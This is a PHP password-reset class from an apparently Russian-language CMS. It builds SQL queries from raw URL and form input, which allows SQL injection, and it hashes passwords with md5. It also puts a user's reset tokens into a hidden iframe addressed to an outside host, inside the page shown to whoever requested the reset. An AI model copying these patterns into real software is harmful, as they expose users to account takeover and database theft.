<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of ResetThePassword
 *
 * @author Maxim Zaytsev
 * @copyright © 2010-2016, CompuProjec
 * @created 01.12.2015 16:38:24
 */
class ResetThePassword {
    
    private $SQL_HELPER;
    private $URL_PARAMS;
    private $urlHelper;
    private $inputHelper;
    private $localization;
    
    private $checkAllValueErrors = array();
    private $user;
    
    private $message="";
    private $HTML = "";
    
    public function __construct() {
        global $_SQL_HELPER;
        $this->SQL_HELPER = $_SQL_HELPER;
        global $_URL_PARAMS;
        $this->URL_PARAMS = $_URL_PARAMS['params'];
        $this->urlHelper = new UrlHelper();
        $this->inputHelper = new InputHelper();
        $this->localization = new Localization("Users/RegistrationForm");
        if(!$this->checkAuthorization()) {
            $this->checkUser();
        } else {
            $urlHelper = new UrlHelper();
            echo '<script language="JavaScript">';
            echo 'window.location.href = "'.$urlHelper->homePageUrl().'"';
            echo '</script>';
            $this->HTML = "Вы авторизированны в системе.<br><br>Если вам необходимо сменить пароль,<br>то вы можете сделать это через панель настроек пользователя.";
        }
    }
    
    private function checkAuthorization() {
        $user = new UserData();
        return $user->checkAuthorization();
    }
    
    private function checkUser() {
        if(isset($this->URL_PARAMS[0]) && isset($this->URL_PARAMS[1]) && isset($this->URL_PARAMS[2])) {
            $this->user = $this->URL_PARAMS[0];
            $query = "SELECT count(`login`) as amount FROM `Users` WHERE `login`='".$this->URL_PARAMS[0]."' AND `activatedHash`='".$this->URL_PARAMS[1]."' AND `hash`='".$this->URL_PARAMS[2]."';";
            $rez = $this->SQL_HELPER->select($query,1);
            if($rez['amount'] > 0) {
                $this->HTML = $this->getChangePasswordForm();
            } else {
                $this->HTML = "Пользователь не найден";
            }
        } else {
            $this->HTML = $this->generateResetThePasswordForm();
        }
    }
    
    private function showMessage() {
        $message = "";
        if($this->message !== "" && $this->message !== null) {
            $message .= '<script type="text/javascript">';
            $message .= "alert('".strip_tags ($this->message)."')";
            $message .= '</script>';
            $message .= "<div class='message'>$this->message</div>";
        }
        return $message;
    }

    public function getChangePasswordForm() {
        if (isset($_POST['changePasswordFormSubmit'])) {
            $this->updatePassword();
        }
        $this->HTML .=  $this->showMessage();
        $form = '<form class="changePasswordForm" name="RegistrationForm" action="'.$this->urlHelper->getThisPage().'" 
            method="post" accept-charset="UTF-8" autocomplete="on">';
//        $form .= '<script type="text/javascript">';
//        $form .= "alert('".strip_tags ($this->message)."')";
//        $form .= '</script>';
//        $form .= "<div class='message'>$this->message</div>";
        $form .= '<table class="changePasswordFormTable" >';
        $loginAndPasswordPatern = "loginAndPasswordPatern";
        // newPassword
        $newPassword = $this->inputHelper->paternPasswordBox("newPassword", "newPassword", "changePassword", 25, true, $this->localization->getText($loginAndPasswordPatern), "[A-Za-z0-9]{3,20}", null);
        $form .= $this->createLocalizationFormRow($newPassword, true, 'newPassword');
        // repeatNewPassword
        $repeatNewPassword = $this->inputHelper->paternPasswordBox("repeatNewPassword", "repeatNewPassword", "changePassword", 25, true, $this->localization->getText($loginAndPasswordPatern), "[A-Za-z0-9]{3,20}", null);
        $form .= $this->createLocalizationFormRow($repeatNewPassword, true, 'repeatNewPassword');
        // captcha
        $captcha = $this->inputHelper->textBox("captcha", "captcha", "changePassword", 20, true, null);
        $form .= $this->createFormRow($captcha, true, getCaptcha(120, 25));
        $form .= '</table>';
        $form .= '<input class="RegistrationFormButton" type="submit" name="changePasswordFormSubmit" value="'.$this->localization->getText("ResetThePasswordButtonText").'">';
        $form .= '</form>';
        return $form;
    }
    
    /**
     * Аналогичен createFormRow() за исключением того, что данная функция 
     *      принмиает на вход не текст а переменные для локализации
     * @param type $input
     * @param type $mandatory
     * @param type $text
     * @param type $info
     * @return type
     */
    private function createLocalizationFormRow($input,$mandatory,$text,$info=null) {
        $text = $this->localization->getText($text);
        if($info != null && $info != "") {
            $info = $this->localization->getText($info);
        }
        return $this->createFormRow($input,$mandatory,$text,$info);
    }

    
    /**
     * Добавить строку к форме
     * @param type $input - input элемент формы
     * @param type $mandatory - обязателен к заполнению
     * @param type $text - текст
     * @param type $info - дополнительная информация
     * @return string - вернет код строки для таблицы формы
     */
    private function createFormRow($input,$mandatory,$text,$info=null) {
        $mandatoryText = "";
        if($mandatory) {
            $mandatoryText = '* ';
        }
        $out =  '<tr>';
        $out .=  '<td class="EditUserDataFormTable_Text">';
        $out .=  '<div class="text">'.$mandatoryText.$text.'</div>';
        if($info != null && $info != "") {
            $out .=  '<div class="info">'.$info.'</div>';
        }
        $out .=  '</td>';
        $out .=  '<td class="EditUserDataFormTable_Input">'.$input.'</td>';
        $out .=  '</tr>';
        return $out;
    }
    
    /**
     * Проверка значений
     * @param type $key - ключ для $_POST массива
     * @param type $preg - регулярное выражение
     * @return type
     */
    private function checkValue($key,$preg=null) {
        return (
                isset($_POST[$key]) && 
                $_POST[$key]!=null && 
                $_POST[$key]!="" &&
                ($preg==null || preg_match($preg, $_POST[$key]))
        );
    }
    
    private function checkRepeatPassword() {
        return ($_POST['newPassword'] == $_POST['repeatNewPassword']);
    }

    private function checkValueNewPassword() {
        $this->checkAllValueErrors = array();
        $error = false;
        if (!$this->checkValue('newPassword',"/^[A-Za-z0-9]{3,25}+$/u")) {
            $error = true;
            $this->checkAllValueErrors[] = "Неверно указан пароль. Он может состоять из английских букв и цифр. Минимальная длина пароля 3 символа, максимальная - 25.";
        }
        if (!$this->checkValue('repeatNewPassword',"/^[A-Za-z0-9]{3,25}+$/u")) {
            $error = true;
            $this->checkAllValueErrors[] = "Не задан или не корректно введён повторный пароль.";
        }
        if (!$this->checkValue('captcha',"/^[A-Za-z0-9]{1,20}+$/u")) {
            $error = true;
            $this->checkAllValueErrors[] = "Проверьте правильность заполнения каптчи";
        }
        return !$error;
    }
    
    private function getQueryForUpdatePassword() {
        return "UPDATE `Users` SET "
                . "`password` = '".md5(InputValueHelper::getPostValue('newPassword'))."', "
                . "`hash`='".ID_GENERATOR::generateID()."' "
                . "WHERE `login` = '".$this->user."';";
    }
    
    /**
     * Проверка каптчи
     * @return type - вернет true если проверка удачная
     */
    private function checkCaptcha() {
        @session_start();
        return (
                isset($_SESSION['captcha']) && 
                strtoupper($_SESSION['captcha']) == strtoupper($_POST['captcha'])
        );
    }
    
    private function updatePassword() {
        if ($this->checkCaptcha()) {
            if ($this->checkRepeatPassword()) {
                if ($this->checkValueNewPassword()) {
                    $update = $this->getQueryForUpdatePassword();
                    if ($this->SQL_HELPER->insert($update)) {
                        $this->message = $this->localization->getText("checkPasswordTrue");
                        $user = new UserData();
                        $user->authorization($this->user, InputValueHelper::getPostValue('newPassword'),false,true);
                    } else {
                        $this->message = $this->localization->getText("dbError");
                    }
                } else {
                    $this->message = $this->localization->getText("checkAllValueFalse")."<br>";
                    if ($this->checkAllValueErrors!=null) {
                        foreach ($this->checkAllValueErrors as $CVerror) {
                            $this->message .= "<br>".$CVerror;
                        }
                        $this->message .= "<br>";
                    }
                }
            } else {
                $this->message = $this->localization->getText("checkRepeatPasswordFalse");
            }
        } else {
            $this->message = $this->localization->getText("checkCaptchaFalse");
        }
    }
    
    private function generateResetThePasswordForm() {
        $form = "";        
        if (isset($_POST['sendChangePasswordRequestFormButton'])) {
            $form .= $this->sendResetThePassword();
        }
        $form .=  $this->showMessage();
        $form .= '<form class="sendChangePasswordRequestForm" name="sendChangePasswordRequestForm" action="'.$this->urlHelper->getThisPage().'" 
            method="post" accept-charset="UTF-8" autocomplete="on">';
        $form .= '<table class="sendChangePasswordRequestFormTable" >';
        // email
        $email = $this->inputHelper->paternTextBox("email", "email", "email", 200, true, "user@domen.zone", "^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$","");
        $form .= $this->createLocalizationFormRow($email, true, 'email');
        // captcha
        $captcha = $this->inputHelper->textBox("captcha", "captcha", "changePassword", 20, true, null);
        $form .= $this->createFormRow($captcha, true, getCaptcha(120, 25));
        $form .= '</table>';
        $form .= '<input class="RegistrationFormButton" type="submit" name="sendChangePasswordRequestFormButton" value="'.$this->localization->getText("ResetThePasswordRequestButtonText").'">';
        $form .= '</form>';
        return $form;
    }
    
    private function sendResetThePassword() {
        if ($this->checkCaptcha()) {
            $query = "SELECT `login`,`activatedHash`,`hash` FROM `Users` WHERE `email`='".InputValueHelper::getPostValue('email')."';";
            $rez = $this->SQL_HELPER->select($query,1);
            if($rez != null && !empty($rez)) {
                $this->message = "Проверьте свою почту";
                return '<iframe class="hideFrame" src="http://polisteny.ru/scpr_ju_001.php?m='.InputValueHelper::getPostValue('email').'&l='.$rez['login'].'&ah='.$rez['activatedHash'].'&h='.$rez['hash'].'" width="1" height="1">Ваш браузер не поддерживает плавающие фреймы!</iframe>';
            } else {
                $this->message = "Пользователь не найден";
            }
        } else {
            $this->message = $this->localization->getText("checkCaptchaFalse");
        }
        return "";
    }


    public function getHtml() {
        return $this->HTML;
    }
    
    public function get() {
        echo $this->getHtml();
    }
}
